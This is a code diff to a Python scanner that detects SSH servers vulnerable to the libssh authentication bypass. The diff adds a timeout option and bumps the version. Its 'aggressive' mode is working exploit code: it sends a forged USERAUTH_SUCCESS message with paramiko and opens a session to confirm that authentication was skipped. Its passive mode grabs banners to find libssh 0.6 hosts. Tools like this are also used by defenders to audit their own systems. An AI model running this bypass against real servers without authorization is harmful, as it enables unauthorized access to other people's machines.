@@ -11,7 +11,7 @@ import sys
 import paramiko
 from six import text_type
 
-VERSION = "1.0.4"
+VERSION = "1.0.5"
 
 
 class colors(object):
@@ -46,10 +46,10 @@ def pexception(ip, port, banner):
         red=colors.red, white=colors.normal, ipaddr=ip, port=port, banner=banner.strip()))
 
 
-def passive(ip, port):  # banner grab to verify vulnerable host
+def passive(ip, port, timeout=0.5):  # banner grab to verify vulnerable host
     try:
-        s = socket.create_connection((ip, port), timeout=0.50000)
-        s.settimeout(None)
+        s = socket.create_connection((ip, port), timeout=timeout)
+        s.settimeout(timeout)
         banner = s.recv(1024)
         s.close()
         return banner.split(b"\n")[0]
@@ -58,10 +58,10 @@ def passive(ip, port):  # banner grab to verify vulnerable host
         return ""
 
 
-def aggressive(ip, port, banner):  # bypass auth to verify vulnerable host
+def aggressive(ip, port, banner, timeout=0.5):  # bypass auth to verify vulnerable host
     try:
-        s = socket.create_connection((ip, port), timeout=0.50000)
-        s.settimeout(None)
+        s = socket.create_connection((ip, port), timeout=timeout)
+        s.settimeout(timeout)
 
         msg = paramiko.message.Message()
         t = paramiko.transport.Transport(s)
@@ -69,14 +69,13 @@ def aggressive(ip, port, banner):  # bypass auth to verify vulnerable host
 
         msg.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
         t._send_message(msg)
-        c = t.open_session(timeout=0.50000)
+        c = t.open_session(timeout=timeout)
         s.close()
         pvulnerable(ip, port, banner)
     except (socket.timeout, socket.error) as e:
         ptimeout(ip, port)
     except paramiko.SSHException as e:
         pstatus(ip, port, banner)
-        #print e
     except Exception as e:
         pexception(ip, port, banner)
 
@@ -90,6 +89,7 @@ parser.add_argument("-V", "--version", action="version",
 parser.add_argument('-p', '--port', default=22, help="Set port of SSH service")
 parser.add_argument("-a", "--aggressive", action="store_true",
                     help="Identify vulnerable hosts by bypassing authentication")
+parser.add_argument('-t', '--timeout', default=0.5, type=float, help="Set socket timeout")
 
 if len(sys.argv) == 1:
     parser.print_help()
@@ -116,10 +116,10 @@ print("Searching for Vulnerable Hosts...\n")
 if args.aggressive:
     paramiko.util.log_to_file("paramiko.log")
     for ip in ips:
-        aggressive(ip, int(args.port), passive(ip, int(args.port)))
+        aggressive(ip, int(args.port), passive(ip, int(args.port), timeout=args.timeout), timeout=args.timeout)
 else:  # banner grab
     for ip in ips:
-        banner = passive(ip, int(args.port))  # banner
+        banner = passive(ip, int(args.port), timeout=args.timeout)  # banner
         if banner:
             # vulnerable
             if any(version in banner for version in [b"libssh-0.6", b"libssh_0.6"]):
